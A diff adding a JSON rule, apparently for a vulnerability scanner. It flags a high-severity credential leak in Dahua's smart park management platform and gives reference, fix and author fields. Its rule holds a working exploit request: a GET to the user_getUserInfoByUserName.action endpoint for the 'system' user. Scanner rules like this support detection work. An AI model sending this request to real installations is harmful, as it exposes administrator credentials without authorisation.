@@ -1,0 +1,24 @@
+{
+    "vul_name": "大华 智慧园区综合管理平台 user_getUserInfoByUserName.action 账号密码泄漏漏洞",
+    "level": "高危",
+    "description": "大华 智慧园区综合管理平台 user_getUserInfoByUserName.action 中存在API接口，导致管理园账号密码泄漏",
+    "product": "大华 智慧园区综合管理平台",
+    "version": "大华 智慧园区综合管理平台",
+    "cve": "无",
+    "reference": "https://peiqi.wgpsec.org/wiki/iot/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8E%20%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20user_getUserInfoByUserName.action%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html",
+    "fixing": "联系大华厂商修复",
+    "rule": {
+        "path": "/admin/user_getUserInfoByUserName.action?userName=system",
+        "method": "GET",
+        "headers": "",
+        "body": "",
+        "status_code": "200",
+        "keywords": "system",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
